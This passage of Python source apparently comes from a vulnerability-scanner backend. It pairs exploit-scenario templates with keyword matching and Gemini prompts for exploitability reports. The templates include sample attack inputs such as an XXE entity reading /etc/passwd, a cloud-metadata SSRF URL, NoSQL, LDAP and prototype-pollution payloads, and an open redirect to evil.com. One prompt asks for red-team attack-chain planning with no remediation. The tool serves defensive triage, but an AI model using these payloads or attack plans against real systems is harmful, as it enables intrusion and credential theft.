        "preconditions": "MD5 used for password hashing or integrity verification",
        "impact": "Password cracking, hash collision attacks, integrity bypass",
        "poc_outline": "1. Capture MD5 hash\n2. Use rainbow tables or hashcat\n3. Recover plaintext or generate collision",
        "mitigation": "Use bcrypt/argon2 for passwords, SHA-256/SHA-3 for integrity. Never use MD5 for security.",
    },
    "sha1": {
        "title": "Weak Cryptographic Hash (SHA-1)",
        "narrative": "SHA-1 has known collision vulnerabilities and is deprecated for security use. Practical collision attacks have been demonstrated.",
        "preconditions": "SHA-1 used for signatures or integrity",
        "impact": "Digital signature forgery, certificate attacks",
        "poc_outline": "1. Identify SHA-1 usage\n2. Apply known collision techniques if applicable\n3. Forge signatures or bypass checks",
        "mitigation": "Migrate to SHA-256 or SHA-3. Update certificates and signing processes.",
    },
    "deserialization": {
        "title": "Insecure Deserialization",
        "narrative": "Deserializing untrusted data can lead to remote code execution, denial of service, or authentication bypass depending on the framework.",
        "preconditions": "Application deserializes user-controlled data",
        "impact": "Remote code execution, DoS, authentication bypass",
        "poc_outline": "1. Identify deserialization entry point\n2. Craft malicious serialized payload (ysoserial, pickle exploits)\n3. Achieve code execution",
        "mitigation": "Avoid deserializing untrusted data. Use safe formats (JSON). Implement integrity checks.",
    },
    "xxe": {
        "title": "XML External Entity (XXE) Injection",
        "narrative": "XML parsers that process external entities can be exploited to read local files, perform SSRF, or cause denial of service.",
        "preconditions": "Application parses XML with external entity processing enabled",
        "impact": "File disclosure, SSRF, DoS, potential RCE",
        "poc_outline": "1. Submit XML with external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n2. Reference &xxe; in document\n3. Observe file contents",
        "mitigation": "Disable DTDs and external entities in XML parser. Use defusedxml (Python) or similar safe parsers.",
    },
    "ssrf": {
        "title": "Server-Side Request Forgery (SSRF)",
        "narrative": "Application makes HTTP requests to user-controlled URLs, allowing access to internal services, cloud metadata, or external attacks.",
        "preconditions": "User input controls URL in server-side HTTP request",
        "impact": "Access internal services, cloud credential theft, port scanning",
        "poc_outline": "1. Provide URL: http://169.254.169.254/latest/meta-data/\n2. Or: http://localhost:8080/admin\n3. Access restricted resources",
        "mitigation": "Whitelist allowed domains. Block internal IP ranges. Use URL parsing and validation.",
    },
    "csrf": {
        "title": "Cross-Site Request Forgery (CSRF)",
        "narrative": "Missing CSRF protection allows attackers to trick authenticated users into performing unintended actions via malicious websites.",
        "preconditions": "User is authenticated, no CSRF token validation",
        "impact": "Account takeover, unauthorized actions, data modification",
        "poc_outline": "1. Create malicious HTML form targeting vulnerable endpoint\n2. Host on attacker site\n3. Trick victim into visiting",
        "mitigation": "Implement CSRF tokens. Use SameSite cookie attribute. Verify Origin/Referer headers.",
    },
    "prototype": {
        "title": "Prototype Pollution",
        "narrative": "JavaScript prototype pollution allows attackers to inject properties into Object.prototype, affecting all objects and potentially leading to RCE or privilege escalation.",
        "preconditions": "User input merged into objects without sanitization",
        "impact": "Property injection, authentication bypass, potential RCE",
        "poc_outline": "1. Submit: __proto__.isAdmin=true\n2. Or: constructor.prototype.isAdmin=true\n3. Check if property affects application logic",
        "mitigation": "Use Object.create(null) for dictionaries. Sanitize keys. Use Map instead of objects.",
    },
    "buffer": {
        "title": "Buffer Overflow Vulnerability",
        "narrative": "Writing beyond buffer boundaries corrupts memory, potentially allowing code execution, crashes, or information disclosure.",
        "preconditions": "Application processes untrusted input without bounds checking",
        "impact": "Remote code execution, denial of service, information leak",
        "poc_outline": "1. Identify buffer size\n2. Send oversized input\n3. Analyze crash for exploitability",
        "mitigation": "Use safe functions (strncpy, snprintf). Enable compiler protections (ASLR, stack canaries). Use memory-safe languages.",
    },
    "format": {
        "title": "Format String Vulnerability",
        "narrative": "User input in printf-style format strings allows reading/writing memory through format specifiers like %n, %x, %s.",
        "preconditions": "User input passed as format string argument",
        "impact": "Information disclosure, arbitrary memory write, code execution",
        "poc_outline": "1. Input: %x%x%x%x to leak stack\n2. Use %n to write to memory\n3. Overwrite return address or GOT",
        "mitigation": "Never use user input as format string. Always use printf('%s', user_input).",
    },
    "null": {
        "title": "Null Pointer Dereference",
        "narrative": "Dereferencing null pointers causes crashes and denial of service. In some cases, memory mapping at address 0 can enable exploitation.",
        "preconditions": "Null pointer can be triggered via specific input",
        "impact": "Denial of service, potential code execution",
        "poc_outline": "1. Identify input causing null pointer\n2. Trigger crash\n3. Analyze for further exploitation",
        "mitigation": "Add null checks. Use static analysis. Enable compiler warnings for null dereference.",
    },
    "regex": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "narrative": "Poorly constructed regex patterns can exhibit exponential backtracking, causing CPU exhaustion with crafted input.",
        "preconditions": "Vulnerable regex processes user input",
        "impact": "Denial of service, resource exhaustion",
        "poc_outline": "1. Identify regex pattern\n2. Craft input with repetitive patterns (e.g., 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!')\n3. Observe CPU spike/hang",
        "mitigation": "Use regex linters. Implement timeouts. Use RE2 or other safe regex engines.",
    },
    "ldap": {
        "title": "LDAP Injection",
        "narrative": "User input in LDAP queries without escaping allows filter manipulation, potentially bypassing authentication or extracting data.",
        "preconditions": "User input used in LDAP filter construction",
        "impact": "Authentication bypass, information disclosure",
        "poc_outline": "1. Input: *)(uid=*))(|(uid=*\n2. Modify filter logic\n3. Bypass authentication or enumerate users",
        "mitigation": "Use parameterized LDAP queries. Escape special characters. Validate input strictly.",
    },
    "nosql": {
        "title": "NoSQL Injection",
        "narrative": "Injection in NoSQL queries (MongoDB, etc.) allows query manipulation, data extraction, or authentication bypass using operators like $gt, $ne.",
        "preconditions": "User input directly used in NoSQL query objects",
        "impact": "Data breach, authentication bypass",
        "poc_outline": "1. Submit: {\"$gt\": \"\"}\n2. Or: {\"$ne\": null}\n3. Bypass conditions or extract data",
        "mitigation": "Use query builders. Validate input types strictly. Sanitize object keys.",
    },
    # === ADDITIONAL VULNERABILITY TYPES FOR COMPREHENSIVE COVERAGE ===
    
    # Authentication & Session Issues
    "auth_bypass": {
        "title": "Authentication Bypass",
        "narrative": "Weak or missing authentication controls allow unauthorized access to protected resources or functions.",
        "preconditions": "Application has authentication flaws or missing checks",
        "impact": "Unauthorized access, privilege escalation, account takeover",
        "poc_outline": "1. Identify protected endpoints\n2. Access without credentials or with forged tokens\n3. Bypass authentication checks",
        "mitigation": "Implement proper authentication. Use established frameworks. Add authorization checks to all sensitive endpoints.",
    },
    "session": {
        "title": "Session Management Vulnerabilities",
        "narrative": "Weak session handling allows session hijacking, fixation, or prediction attacks.",
        "preconditions": "Application uses weak session identifiers or insecure transmission",
        "impact": "Account takeover, session hijacking, unauthorized access",
        "poc_outline": "1. Analyze session token entropy\n2. Check for session fixation\n3. Test session timeout and invalidation",
        "mitigation": "Use secure, random session tokens. Regenerate on auth. Set secure cookie flags (HttpOnly, Secure, SameSite).",
    },
    "jwt": {
        "title": "JWT Security Issues",
        "narrative": "JSON Web Token vulnerabilities including algorithm confusion, weak secrets, or missing validation.",
        "preconditions": "Application uses JWT for authentication/authorization",
        "impact": "Token forgery, authentication bypass, privilege escalation",
        "poc_outline": "1. Decode JWT payload\n2. Try algorithm=none attack\n3. Brute force weak secrets\n4. Test signature verification",
        "mitigation": "Use strong secrets. Validate algorithm explicitly. Check all claims. Use asymmetric keys for production.",
    },
    
    # Input Validation
    "header_injection": {
        "title": "HTTP Header Injection",
        "narrative": "User input in HTTP headers enables response splitting, cache poisoning, or session fixation attacks.",
        "preconditions": "User input included in HTTP response headers",
        "impact": "Cache poisoning, XSS via headers, session fixation",
        "poc_outline": "1. Inject CRLF: %0d%0a\n2. Add malicious headers\n3. Perform response splitting",
        "mitigation": "Sanitize all header values. Reject newlines in user input. Use framework header APIs.",
    },
    "template": {
        "title": "Server-Side Template Injection (SSTI)",
        "narrative": "User input in template engines can execute arbitrary code. Affects Jinja2, Twig, Freemarker, etc.",
        "preconditions": "User input rendered directly in server-side templates",
        "impact": "Remote code execution, server compromise",
        "poc_outline": "1. Test: {{7*7}} or ${7*7}\n2. Identify template engine\n3. Use engine-specific RCE payload",
        "mitigation": "Never pass user input to template render. Use sandboxed templates. Implement strict input validation.",
    },
    "log_injection": {
        "title": "Log Injection / Log Forging",
        "narrative": "User input written to logs without sanitization allows log forgery, injection of fake entries, or exploitation of log viewers.",
        "preconditions": "User input logged without sanitization",
        "impact": "Log manipulation, exploit log analysis tools, hide attacks",
        "poc_outline": "1. Inject newlines and fake log entries\n2. Test ANSI escape sequences\n3. Try Log4Shell-style payloads",
        "mitigation": "Sanitize log inputs. Encode special characters. Use structured logging.",
    },
    
    # Memory Safety (C/C++)
    "use_after_free": {
        "title": "Use-After-Free Vulnerability",
        "narrative": "Memory accessed after being freed can lead to code execution, crashes, or information disclosure.",
        "preconditions": "Memory management error in C/C++ code",
        "impact": "Remote code execution, denial of service, information disclosure",
        "poc_outline": "1. Identify freed memory access\n2. Trigger reallocation with controlled data\n3. Exploit dangling pointer",
        "mitigation": "Use smart pointers (C++). Set pointers to NULL after free. Use memory sanitizers in testing.",
    },
    "double_free": {
        "title": "Double-Free Vulnerability",
        "narrative": "Freeing memory twice corrupts heap metadata, potentially enabling arbitrary write or code execution.",
        "preconditions": "Memory freed multiple times",
        "impact": "Heap corruption, code execution, denial of service",
        "poc_outline": "1. Identify double-free condition\n2. Manipulate heap layout\n3. Achieve arbitrary write primitive",
        "mitigation": "Set pointers to NULL after free. Use smart pointers. Run with address sanitizer.",
    },
    "integer_overflow": {
        "title": "Integer Overflow/Underflow",
        "narrative": "Arithmetic operations exceeding integer bounds cause unexpected values, leading to buffer overflows or logic errors.",
        "preconditions": "Arithmetic on user-controlled integers without bounds checking",
        "impact": "Buffer overflow, logic bypass, denial of service",
        "poc_outline": "1. Identify integer operation\n2. Provide values near MAX_INT or 0\n3. Trigger wraparound behavior",
        "mitigation": "Use safe integer libraries. Check bounds before operations. Use larger integer types.",
    },
    "race_condition": {
        "title": "Race Condition / TOCTOU",
        "narrative": "Time-of-check to time-of-use race conditions allow attackers to manipulate state between security check and operation.",
        "preconditions": "Security check and operation are non-atomic",
        "impact": "Privilege escalation, security bypass, data corruption",
        "poc_outline": "1. Identify check-then-use pattern\n2. Win race with rapid requests or symlink attacks\n3. Bypass security check",
        "mitigation": "Use atomic operations. Lock resources. Avoid filesystem races with O_NOFOLLOW.",
    },
    "uninitialized": {
        "title": "Uninitialized Memory Usage",
        "narrative": "Reading uninitialized memory can leak sensitive data or cause unpredictable behavior.",
        "preconditions": "Code path reads memory before initialization",
        "impact": "Information disclosure, undefined behavior, crashes",
        "poc_outline": "1. Trigger code path with uninitialized read\n2. Observe leaked data or crash\n3. Exploit for information disclosure",
        "mitigation": "Initialize all variables. Use compiler warnings. Enable memory sanitizers.",
    },
    
    # Cryptography
    "weak_cipher": {
        "title": "Weak Encryption Algorithm",
        "narrative": "Use of deprecated encryption algorithms (DES, RC4, ECB mode) enables cryptographic attacks.",
        "preconditions": "Application uses weak encryption for sensitive data",
        "impact": "Data decryption, confidentiality breach",
        "poc_outline": "1. Identify encryption algorithm\n2. Apply known attacks (brute force for DES, biases for RC4)\n3. Decrypt protected data",
        "mitigation": "Use AES-256-GCM or ChaCha20-Poly1305. Avoid ECB mode. Use authenticated encryption.",
    },
    "insecure_tls": {
        "title": "Insecure TLS/SSL Configuration",
        "narrative": "Weak TLS versions (SSLv3, TLS 1.0) or cipher suites enable protocol attacks and decryption.",
        "preconditions": "Application accepts weak TLS configurations",
        "impact": "Man-in-the-middle attacks, traffic decryption",
        "poc_outline": "1. Scan TLS configuration\n2. Identify weak protocols/ciphers\n3. Perform downgrade or known attacks (BEAST, POODLE)",
        "mitigation": "Require TLS 1.2+. Disable weak ciphers. Use modern cipher suites. Enable HSTS.",
    },
    "hardcoded_key": {
        "title": "Hardcoded Cryptographic Key",
        "narrative": "Encryption keys embedded in source code can be extracted, compromising all encrypted data.",
        "preconditions": "Access to source code or binary",
        "impact": "Complete compromise of encrypted data, authentication bypass",
        "poc_outline": "1. Extract key from source/binary\n2. Decrypt protected data\n3. Forge authenticated tokens",
        "mitigation": "Use key management systems. Derive keys from secure sources. Never commit keys to repositories.",
    },
    
    # Information Disclosure
    "info_disclosure": {
        "title": "Sensitive Information Disclosure",
        "narrative": "Application exposes sensitive data through error messages, debug info, or improper access controls.",
        "preconditions": "Application reveals sensitive information",
        "impact": "Data breach, aids further attacks, compliance violations",
        "poc_outline": "1. Trigger error conditions\n2. Examine responses for stack traces, paths, versions\n3. Use disclosed info for targeted attacks",
        "mitigation": "Use generic error messages. Disable debug mode in production. Implement proper access controls.",
    },
    "directory_listing": {
        "title": "Directory Listing Enabled",
        "narrative": "Web server directory listing exposes file structure, backup files, and potentially sensitive resources.",
        "preconditions": "Web server has directory listing enabled",
        "impact": "Information disclosure, discovery of sensitive files",
        "poc_outline": "1. Access directory URLs without index file\n2. Browse exposed files\n3. Find backups, configs, or source code",
        "mitigation": "Disable directory listing. Add index files. Implement proper access controls.",
    },
    
    # Denial of Service
    "resource_exhaustion": {
        "title": "Resource Exhaustion / DoS",
        "narrative": "Application allows unbounded resource consumption leading to denial of service.",
        "preconditions": "Application processes unbounded user input",
        "impact": "Service unavailability, resource exhaustion",
        "poc_outline": "1. Identify resource-intensive operations\n2. Send large/many requests\n3. Exhaust CPU, memory, or connections",
        "mitigation": "Implement rate limiting. Set resource limits. Use timeouts. Validate input sizes.",
    },
    "zip_bomb": {
        "title": "Zip Bomb / Decompression Attack",
        "narrative": "Malicious compressed files expand to enormous sizes, exhausting disk space or memory.",
        "preconditions": "Application extracts user-uploaded archives",
        "impact": "Denial of service, disk exhaustion",
        "poc_outline": "1. Create nested/recursive compressed file\n2. Upload to application\n3. Exhaust resources during extraction",
        "mitigation": "Limit extraction size. Check compression ratio. Extract to isolated environments.",
    },
    
    # File Operations
    "file_upload": {
        "title": "Unrestricted File Upload",
        "narrative": "Insufficient validation of uploaded files allows execution of malicious code or overwriting critical files.",
        "preconditions": "Application accepts file uploads without proper validation",
        "impact": "Remote code execution, defacement, data destruction",
        "poc_outline": "1. Upload webshell with allowed extension bypass\n2. Access uploaded file\n3. Execute commands",
        "mitigation": "Validate file types server-side. Store outside webroot. Rename uploaded files. Scan for malware.",
    },
    "symlink": {
        "title": "Symbolic Link Attack",
        "narrative": "Following symbolic links allows reading or writing files outside intended directories.",
        "preconditions": "Application follows symlinks in user-controlled paths",
        "impact": "Arbitrary file read/write, privilege escalation",
        "poc_outline": "1. Create symlink to sensitive file\n2. Access through application\n3. Read /etc/passwd or write to config",
        "mitigation": "Use O_NOFOLLOW flag. Validate real paths. Avoid operations on symlinks.",
    },
    
    # Go-specific (gosec)
    "gosec_subprocess": {
        "title": "Go Subprocess Security Issue",
        "narrative": "Unsafe subprocess execution in Go code may allow command injection.",
        "preconditions": "User input reaches exec.Command or similar",
        "impact": "Command injection, remote code execution",
        "poc_outline": "1. Identify user input in command\n2. Inject shell metacharacters\n3. Execute arbitrary commands",
        "mitigation": "Use exec.Command with separate arguments. Never use shell expansion. Validate inputs.",
    },
    "gosec_crypto": {
        "title": "Go Weak Cryptography",
        "narrative": "Use of weak cryptographic functions in Go (MD5, SHA1, weak random).",
        "preconditions": "Application uses weak crypto for security operations",
        "impact": "Cryptographic weakness, token prediction",
        "poc_outline": "1. Identify weak crypto usage\n2. Apply appropriate attack\n3. Crack hashes or predict values",
        "mitigation": "Use crypto/sha256, crypto/rand. Avoid md5, sha1 for security purposes.",
    },
    
    # Java-specific (SpotBugs)
    "java_injection": {
        "title": "Java Injection Vulnerability",
        "narrative": "Various injection vulnerabilities in Java code including EL injection, OGNL injection, etc.",
        "preconditions": "User input reaches expression evaluation",
        "impact": "Remote code execution, data access",
        "poc_outline": "1. Identify expression language usage\n2. Inject malicious expressions\n3. Achieve code execution",
        "mitigation": "Sanitize inputs. Disable expression evaluation on user data. Use parameterized queries.",
    },
    "java_xxe": {
        "title": "Java XXE Vulnerability",
        "narrative": "XML processing in Java without disabling external entities enables XXE attacks.",
        "preconditions": "Application parses XML with default settings",
        "impact": "File disclosure, SSRF, denial of service",
        "poc_outline": "1. Submit XML with external entity\n2. Reference entity in document\n3. Exfiltrate data",
        "mitigation": "Disable DTDs: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)",
    },
    
    # Insecure Configuration
    "cors": {
        "title": "Insecure CORS Configuration",
        "narrative": "Overly permissive Cross-Origin Resource Sharing allows unauthorized cross-origin requests.",
        "preconditions": "Application has misconfigured CORS headers",
        "impact": "Data theft from authenticated users, CSRF-like attacks",
        "poc_outline": "1. Check Access-Control-Allow-Origin header\n2. Create malicious page on attacker domain\n3. Steal data from authenticated requests",
        "mitigation": "Whitelist specific origins. Never use * with credentials. Validate Origin header.",
    },
    "open_redirect": {
        "title": "Open Redirect Vulnerability",
        "narrative": "User-controlled redirect URLs enable phishing attacks by redirecting users to malicious sites.",
        "preconditions": "Redirect URL controllable via user input",
        "impact": "Phishing, credential theft, malware distribution",
        "poc_outline": "1. Identify redirect parameter\n2. Set to external URL: ?redirect=https://evil.com\n3. Trick users into visiting malicious site",
        "mitigation": "Whitelist allowed redirect destinations. Use relative URLs. Validate against trusted domains.",
    },
    "clickjacking": {
        "title": "Clickjacking / UI Redressing",
        "narrative": "Missing X-Frame-Options allows embedding site in iframes for clickjacking attacks.",
        "preconditions": "Application can be framed, has sensitive actions",
        "impact": "Unauthorized actions, data theft",
        "poc_outline": "1. Create page that iframes target\n2. Overlay invisible buttons\n3. Trick user into clicking",
        "mitigation": "Set X-Frame-Options: DENY. Use Content-Security-Policy frame-ancestors. Implement frame-busting.",
    },
}


def _get_template_for_finding(finding: models.Finding) -> Optional[dict]:
    """Check if a finding matches a pre-built template."""
    summary_lower = finding.summary.lower()
    details_str = str(finding.details).lower() if finding.details else ""
    finding_type = (finding.type or "").lower()
    combined = summary_lower + " " + details_str + " " + finding_type
    
    # Direct key matches
    for key, template in EXPLOIT_TEMPLATES.items():
        if key in combined:
            return template
    
    # Additional pattern matching for common vulnerabilities
    patterns = {
        "password": ["password", "credential", "hardcoded", "passwd", "b105", "b106", "b107"],
        "secret": ["api_key", "apikey", "secret", "token", "private_key", "b104"],
        "sql": ["sql injection", "sqli", "query injection", "b608"],
        "xss": ["cross-site scripting", "xss", "script injection", "reflected", "b320"],
        "eval": ["eval(", "evaluate", "code injection", "b307"],
        "exec": ["exec(", "system(", "popen(", "command injection", "os.system", "subprocess", "b602", "b603", "b604", "b605", "b606", "b607"],
        "shell=true": ["shell=true", "shell injection", "b604"],
        "buffer": ["buffer overflow", "stack overflow", "heap overflow", "out of bounds", "cwe-120", "cwe-122", "cwe-131"],
        "format": ["format string", "printf", "sprintf"],
        "null": ["null pointer", "nullptr", "null dereference", "nullderef", "cwe-476"],
        "md5": ["md5", "weak hash", "b303", "b324"],
        "sha1": ["sha1", "sha-1", "b303"],
        "rand": ["random", "rand()", "math.random", "insecure random", "pseudo-random", "b311"],
        "deserialization": ["deserialize", "unpickle", "unserialize", "yaml.load", "b301", "b506"],
        "xxe": ["xxe", "xml external", "external entity", "b313", "b314", "b318", "b319", "b320"],
        "ssrf": ["ssrf", "server-side request", "b310"],
        "csrf": ["csrf", "cross-site request forgery"],
        "prototype": ["prototype pollution", "__proto__"],
        "path_traversal": ["path traversal", "directory traversal", "../", "lfi", "rfi", "b108"],
        "regex": ["redos", "regex dos", "catastrophic backtracking"],
        "ldap": ["ldap injection"],
        "nosql": ["nosql injection", "mongodb injection"],
        # Additional common scanner patterns
        "exec": ["os.popen", "subprocess.call", "subprocess.run", "subprocess.popen", "commands."],
        "sql": ["execute(", "executemany(", "cursor.execute", "raw(", ".extra(", ".raw("],
        "xss": ["mark_safe", "safestring", "|safe", "dangerouslysetinnerhtml"],
        "secret": ["aws_access_key", "aws_secret", "github_token", "slack_token", "stripe"],
        "deserialization": ["pickle.load", "cpickle", "shelve", "marshal.load", "yaml.load", "yaml.unsafe"],
    }
    
    for template_key, keywords in patterns.items():
        for keyword in keywords:
            if keyword in combined:
                return EXPLOIT_TEMPLATES.get(template_key)
    
    # Check finding type
    if finding.type == "secret":
        return EXPLOIT_TEMPLATES["secret"]
    
    return None


def _build_prompt(finding: models.Finding, code_snippet: str) -> str:
    """Build the prompt for exploitability analysis with length limits."""
    # Truncate code snippet to save tokens
    truncated_code = code_snippet[:MAX_CODE_SNIPPET_LENGTH]
    if len(code_snippet) > MAX_CODE_SNIPPET_LENGTH:
        truncated_code += "\n... (truncated)"
    
    prompt = (
        "You are a security analyst. Given the finding details and code snippet, provide a concise analysis:\n"
        "1. How an attacker could exploit this (2-3 sentences)\n"
        "2. Key preconditions required\n"
        "3. Potential impact\n"
        "4. One mitigation recommendation\n\n"
        "Do not provide runnable exploit code. Be concise.\n\n"
        f"Finding: {finding.summary}\n"
        f"Severity: {finding.severity}\n"
        f"File: {finding.file_path}\n"
        f"Code:\n{truncated_code}"
    )
    
    # Enforce total prompt length
    return prompt[:MAX_PROMPT_LENGTH]


async def call_gemini(prompt: str) -> str:
    """
    Call Gemini API for exploitability analysis using the new google-genai SDK.
    
    Args:
        prompt: The analysis prompt to send
        
    Returns:
        Generated narrative or fallback message
    """
    if not settings.gemini_api_key:
        logger.debug("Gemini API key not configured, returning stub narrative")
        return "Gemini API key not configured. This is a stubbed exploitability narrative."
    
    try:
        from google import genai
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        response = client.models.generate_content(
            model=settings.gemini_model_id,
            contents=prompt
        )
        
        if response and response.text:
            logger.debug("Successfully generated exploitability narrative")
            return response.text
        
        logger.warning("Gemini returned no content")
        return "No exploitability narrative generated - no content returned."
        
    except ImportError:
        logger.error("google-genai package not installed. Run: pip install google-genai")
        return "google-genai package not installed. Please install it."
    except Exception as e:
        logger.error(f"Gemini API error: {e}")
        return f"Failed to contact Gemini: {str(e)}. Provide manual analysis based on finding details."


async def generate_exploit_scenarios(
    db: Session, 
    report: models.Report, 
    mode: AnalysisMode = "auto"
) -> List[models.ExploitScenario]:
    """
    Generate exploitability scenarios for high/critical findings in a report.
    
    Modes:
    - "full": Individual exploit scenarios for each finding (uses templates + limited LLM)
    - "summary": Single executive summary of all findings (1 LLM call) + templates for all
    - "auto": Automatically selects based on finding count (<=20 = full, >20 = summary)
    
    Args:
        db: Database session
        report: Report model to generate scenarios for
        mode: Analysis mode - "full", "summary", or "auto"
        
    Returns:
        List of created ExploitScenario models
    """
    findings = (
        db.query(models.Finding)
        .filter(models.Finding.scan_run_id == report.scan_run_id)
        .filter(models.Finding.severity.in_(["high", "critical"]))
        .all()
    )
    
    # Sort by severity (critical first)
    findings.sort(key=lambda f: 0 if f.severity == "critical" else 1)
    
    # Auto-select mode based on finding count
    if mode == "auto":
        mode = "full" if len(findings) <= FULL_ANALYSIS_THRESHOLD else "summary"
    
    logger.info(f"Processing {len(findings)} high/critical findings in '{mode}' mode")
    
    scenarios: List[models.ExploitScenario] = []
    
    # Generate executive summary first if in summary mode
    if mode == "summary" and findings:
        summary_scenario = await _generate_executive_summary(db, report, findings)
        if summary_scenario:
            scenarios.append(summary_scenario)
    
    # Generate individual scenarios (templates only in summary mode, templates+LLM in full mode)
    individual_scenarios = await _generate_individual_scenarios(
        db, report, findings, use_llm=(mode == "full")
    )
    scenarios.extend(individual_scenarios)
    
    db.commit()
    logger.info(f"Generated {len(scenarios)} exploit scenarios for report {report.id} (mode: {mode})")
    return scenarios


async def _generate_executive_summary(
    db: Session, 
    report: models.Report, 
    findings: List[models.Finding]
) -> Optional[models.ExploitScenario]:
    """
    Generate a single executive summary analyzing all findings together.
    Uses just 1 LLM call regardless of finding count.
    """
    if not settings.gemini_api_key:
        logger.debug("Gemini API key not configured, skipping executive summary")
        return None
    
    # Build summary of findings for the prompt
    critical_count = sum(1 for f in findings if f.severity == "critical")
    high_count = sum(1 for f in findings if f.severity == "high")
    
    # Group findings by type/category
    finding_types = {}
    for f in findings:
        # Try to categorize by common patterns
        category = _categorize_finding(f)
        if category not in finding_types:
            finding_types[category] = []
        finding_types[category].append(f)
    
    # Build a concise summary for the prompt
    findings_summary = []
    for category, cat_findings in sorted(finding_types.items(), key=lambda x: -len(x[1])):
        sample = cat_findings[0]
        findings_summary.append(
            f"- {category}: {len(cat_findings)} findings (e.g., {sample.file_path}: {sample.summary[:80]})"
        )
    
    prompt = f"""You are an elite red team operator writing an exploit development summary.

The codebase has {len(findings)} high/critical security findings:
- Critical: {critical_count}
- High: {high_count}

Vulnerability categories found:
{chr(10).join(findings_summary[:15])}

Write an exploit development summary using this EXACT format:

**Overall Exploitability Assessment**
Rate as CRITICAL/HIGH/MEDIUM exploitability with 1-2 sentence justification.

**Attack Chain Priority**
1. **First target** - Why this is the best entry point
2. **Second target** - What to chain next
3. **Third target** - How to escalate

**Recommended Exploit Development Order**
 **Immediate** - Exploits that can be developed in hours
 **Short-term** - Exploits requiring days of development
 **Advanced** - Complex chains requiring significant effort

**Key Attack Surfaces**
 Surface 1 - Brief description
 Surface 2 - Brief description
 Surface 3 - Brief description

FORMATTING RULES:
- Use **bold** for headers and key terms
- Use numbered lists (1. 2. 3.) for ordered steps
- Use bullet points () for unordered lists
- Be specific about vulnerability types and exploitation techniques
- Think like a hacker, no remediation advice"""

    summary_text = await call_gemini(prompt)
    
    # Create exploit development summary as a special scenario
    scenario = models.ExploitScenario(
        report_id=report.id,
        finding_id=None,  # Not tied to a specific finding
        severity="critical",  # Mark as critical to appear first
        title="Exploit Development Summary",
        narrative=summary_text,
        preconditions="This is an overall exploitability assessment for red team planning.",
        impact=f"Analysis covers {critical_count} critical and {high_count} high severity findings across multiple attack vectors.",
        poc_outline="See individual vulnerability type scenarios below for specific exploitation techniques.",
        mitigation_notes="Focus on high-value targets first. Chain vulnerabilities for maximum impact.",
    )
    db.add(scenario)
    return scenario


def _categorize_finding(finding: models.Finding) -> str:
    """Categorize a finding into a high-level category for summarization."""
    summary_lower = finding.summary.lower()
    details_str = str(finding.details).lower() if finding.details else ""
    combined = summary_lower + " " + details_str
    
    categories = {
        "Command Injection": ["exec", "system", "popen", "shell", "command", "subprocess"],
        "SQL Injection": ["sql", "query", "execute"],
        "Cross-Site Scripting (XSS)": ["xss", "script", "cross-site"],
        "Hardcoded Secrets": ["password", "secret", "api_key", "credential", "token"],
        "Insecure Cryptography": ["md5", "sha1", "weak", "crypto", "random", "rand"],
        "Path Traversal": ["path", "directory", "traversal", "../"],
        "Deserialization": ["pickle", "deserialize", "yaml.load", "unserialize"],
        "XML/XXE": ["xml", "xxe", "entity"],
        "Buffer Overflow": ["buffer", "overflow", "bounds"],
        "Code Injection": ["eval", "code injection"],
        "SSRF": ["ssrf", "request forgery"],
        "Authentication Issues": ["auth", "login", "session"],
    }
    
    for category, keywords in categories.items():
        for keyword in keywords:
            if keyword in combined:
                return category
    
    return "Other Security Issues"


def _extract_rule_id(finding: models.Finding) -> Optional[str]:
    """Extract a rule ID from finding details for grouping similar issues."""
    if not finding.details:
        return None
    
    details = finding.details if isinstance(finding.details, dict) else {}
    
    # Try common rule ID fields from different scanners
    rule_id = (
        details.get("rule_id") or
        details.get("ruleId") or
        details.get("check_id") or
        details.get("checkId") or
        details.get("test_id") or
        details.get("testId") or
        details.get("code") or  # Bandit uses 'code' sometimes
        details.get("id")
    )
    
    if rule_id:
        return str(rule_id).strip()
    
    # Try to extract from message/summary patterns like "[B101]" or "CWE-123"
    import re
    summary = finding.summary or ""
    
    # Match patterns like B101, B602, CWE-123, G101, etc.
    patterns = [
        r'\b([BG]\d{3})\b',  # Bandit (B101) and gosec (G101)
        r'\b(CWE-\d+)\b',  # CWE identifiers
        r'\b(S\d{4})\b',  # SonarQube rules
        r'\b(security/[a-z-]+)\b',  # ESLint security plugin
    ]
    
    for pattern in patterns:
        match = re.search(pattern, summary, re.IGNORECASE)
        if match:
            return match.group(1).upper()
    
    return None


def _format_rule_title(rule_id: str) -> str:
    """Format a rule ID into a human-readable title."""
    # Known rule prefixes
    prefixes = {
        "B": "Bandit",
        "G": "Gosec", 
        "S": "SonarQube",
        "CWE": "CWE",
    }
    
    for prefix, name in prefixes.items():
        if rule_id.startswith(prefix):
            return f"{name} {rule_id}"
    
    # Clean up rule IDs like "security/detect-eval-with-expression"
    if "/" in rule_id:
        parts = rule_id.split("/")
        return parts[-1].replace("-", " ").title()
    
    return rule_id


def _format_type_title(type_name: str) -> str:
    """Format a finding type into a human-readable title."""
    type_titles = {
        "sast": "Static Analysis Security",
        "secret": "Secret Detection",
        "dependency": "Dependency Vulnerability",
        "code_smell": "Code Quality",
        "vulnerability": "Security Vulnerability",
        "bug": "Potential Bug",
        "semgrep": "Semgrep",
        "bandit": "Bandit",
        "eslint": "ESLint",
        "gosec": "Gosec",
        "spotbugs": "SpotBugs",
        "clangtidy": "Clang-Tidy",
    }
    
    return type_titles.get(type_name.lower(), type_name.replace("_", " ").title())


def _create_catchall_scenario(
    db: Session,
    report: models.Report,
    findings: List[models.Finding],
    title: str,
    use_llm: bool = False
) -> Optional[models.ExploitScenario]:
    """Create a catch-all scenario for ungrouped findings."""
    if not findings:
        return None
    
    severities = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
    highest_severity = max(findings, key=lambda f: severities.get(f.severity, 0)).severity
    
    all_files = list(set(f.file_path for f in findings if f.file_path))
    files_str = ", ".join(all_files[:5])
    if len(all_files) > 5:
        files_str += f" (+{len(all_files) - 5} more)"
    
    # Build narrative from sample findings
    sample_summaries = list(set(f.summary for f in findings[:3]))
    sample_text = "\n".join(f"- {s[:100]}..." if len(s) > 100 else f"- {s}" for s in sample_summaries)
    
    narrative = f"**{len(findings)} instances found** across the codebase.\n\n"
    narrative += f"**Sample issues:**\n{sample_text}\n\n"
